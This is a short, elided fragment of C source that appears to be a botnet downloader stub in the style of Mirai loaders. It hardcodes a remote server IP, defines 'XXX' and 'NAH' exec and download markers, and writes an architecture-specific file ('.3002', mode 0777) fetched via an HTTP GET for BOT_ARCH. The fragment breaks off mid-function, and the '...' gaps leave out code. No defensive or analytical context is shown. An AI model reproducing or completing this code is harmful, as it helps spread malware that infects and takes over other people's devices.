...
#define HTTP_SERVER utils_inet_addr(109,98,208,52)

#define EXEC_MSG            "XXX\n"
#define EXEC_MSG_LEN        4

#define DOWNLOAD_MSG        "NAH\n"
...
inline void run(void)
{
    ...
    ffd = open(".3002", O_WRONLY | O_CREAT | O_TRUNC, 0777);
    ...
    if (write(sfd, "GET /" BOT_ARCH " HTTP/1.0\r\n\r\n", 4 + arch_strlen + 13) != (4 + arch_strlen + 13))
    {
#ifdef DEBUG
